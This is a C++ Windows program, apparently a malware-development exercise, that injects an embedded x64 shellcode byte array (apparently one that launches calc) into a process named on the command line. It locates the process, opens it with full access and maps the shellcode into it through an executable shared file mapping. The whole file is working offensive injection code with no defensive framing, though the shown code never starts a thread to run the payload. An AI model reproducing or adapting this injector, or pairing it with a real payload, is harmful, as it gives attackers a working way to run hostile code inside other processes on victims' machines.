#include <iostream>
#include <windows.h>
#include <string>
#include <assert.h>
#include <TlHelp32.h>
#include <cctype>

#pragma comment (lib, "OneCore.lib")

using namespace std;

unsigned char Payload[] = {0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
                        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
                        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
                        0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
                        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
                        0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
                        0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
                        0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
                        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
                        0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
                        0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
                        0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
                        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
                        0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
                        0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
                        0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
                        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
                        0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
                        0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
                        0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
                        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
                        0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
                        0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00};

bool RemoteMapFileInjection(HANDLE hProcess, PBYTE Payload, SIZE_T sPayloadSize, PVOID* ppAddress) {
    bool bState = true;
    HANDLE hFile = NULL;
    PVOID pMapLocalAddress = NULL;
    PVOID pMapRemoteAddress = NULL;

    hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sPayloadSize, NULL);
    if (hFile == NULL) {
        cout << "Error in Creating File Mapping .." << endl;
        cout << "\t[!] Error: " << GetLastError() << endl;
        bState = false;
        goto _EndOfFunction;
    }

    pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, 0, 0, sPayloadSize);
    if (pMapLocalAddress == NULL) {
        cout << "[!] MapViewOfFile Failed With Error: " << GetLastError() << endl;
        bState = false;
        goto _EndOfFunction;
    }

    memcpy(pMapLocalAddress, Payload, sPayloadSize);
    pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);

    if (pMapRemoteAddress == NULL) {
        cout << "\t[!] MapViewOfFile2 Failed With Error: " << GetLastError() << endl;
        bState = false;
        goto _EndOfFunction;
    }

    cout << "\t[+] Remote Mapping Address: 0x" << pMapRemoteAddress << endl;

_EndOfFunction:
    *ppAddress = pMapRemoteAddress;
    if (hFile)
        CloseHandle(hFile);
    return bState;
}

bool GetRemoteProcessHandle(wstring szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
    HANDLE hSnapShot = NULL;
    PROCESSENTRY32 Proc;
    Proc.dwSize = sizeof(PROCESSENTRY32);

    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        cout << "\t[!] CreateToolhelp32Snapshot Failed With Error: " << GetLastError() << endl;
        goto _EndOfFunction;
    }
    if (!Process32First(hSnapShot, &Proc)) {
        cout << "\n\t[!] Process32First Failed With Error: " << GetLastError() << endl;
        goto _EndOfFunction;
    }

    do {
        WCHAR LowerName[MAX_PATH * 2];

        if (Proc.szExeFile) {
            DWORD dwSize = lstrlenW(Proc.szExeFile);
            DWORD i = 0;

            ZeroMemory(LowerName, MAX_PATH * 2);

            if (dwSize < MAX_PATH * 2) {
                for (; i < dwSize; i++)
                    LowerName[i] = (WCHAR)tolower((unsigned char)Proc.szExeFile[i]);

                LowerName[i++] = '\0';
            }
        }

        if (wcscmp(LowerName, szProcessName.c_str()) == 0) {
            *dwProcessId = Proc.th32ProcessID;

            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
            if (*hProcess == NULL)
                cout << "\n\t[!] OpenProcess Failed With Error: " << GetLastError() << endl;

            break;
        }
    } while (Process32Next(hSnapShot, &Proc));

_EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    if (*dwProcessId == NULL || *hProcess == NULL)
        return false;
    return true;
}

int wmain(int argc, wchar_t* argv[]) {
    HANDLE hProcess;
    HANDLE hThread;
    PVOID pAddress;
    DWORD dwProcessID;

    if (argc < 2) {
        wcout << L"[!] Usage: \"" << argv[0] << L"\" <Process Name>" << endl;
        return -1;
    }

    wcout << L"[i] Searching For Process Id Of \"" << argv[1] << L"\" ... ";
    if (!GetRemoteProcessHandle(argv[1], &dwProcessID, &hProcess)) {
        cout << "[!] Process is Not Found" << endl;
        return -1;
    }

    cout << "[+] DONE" << endl;
    cout << "[+] Found Target Process Pid: " << dwProcessID << endl;
    cout << "[i] Injecting Target Process ..." << endl;

    if (!RemoteMapFileInjection(hProcess, Payload, sizeof(Payload), &pAddress)) {
        cout << "[!] Error in Injecting Remote Process .." << endl;
        return -1;
    }
    cout << "\t[+] DONE" << endl;
    return 0;
}
